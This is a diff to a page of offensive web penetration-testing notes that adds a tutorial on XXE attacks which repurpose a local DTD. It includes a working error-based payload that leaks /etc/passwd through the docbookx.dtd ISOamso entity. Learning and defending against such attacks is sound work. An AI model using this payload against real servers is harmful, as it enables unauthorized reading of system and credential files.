@@ -183,6 +183,33 @@ you are setting.
 it is added same format as RFI or LFI attacks.
 	
 </details>
+<details>
+<summary>XXE TO RETRIEVE DATA / REPURPOSING A LOCAL DTD</summary>
+- in order to exploit this one, you will need to reuse an existing DTD that is stored on the server, you will use it as benefit
+for the attack.
+- so first you need to know what environment you are working on to search for existing well know DTD to reference.
+
+format of the DTD to use:
+1. you need to declare the local DTD
+2. you need to declare the entity
+3. you need to declare the content to retrieve with a SYSTEM entity
+4. you need to declare the EVAL entity with an ERROR entity to a non-existent file to generate the error
+5. invoke all 3 entities
+
+sample payload:
+
+&lt;!DOCTYPE message [
+&lt;!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"&gt;
+&lt;!ENTITY % ISOamso '
+&lt;!ENTITY &#x25; file SYSTEM "file:///etc/passwd"&gt;
+&lt;!ENTITY &#x25; eval "&lt;!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;&gt;"&gt;
+&#x25;eval;
+&#x25;error;
+'&gt;
+%local_dtd;
+]&gt;
+	
+</details>
 </div>
 </pre>
 <button onclick="document.location='/offensive/web_penetration_testing/server_side_attacks.html'">GO BACK</button>
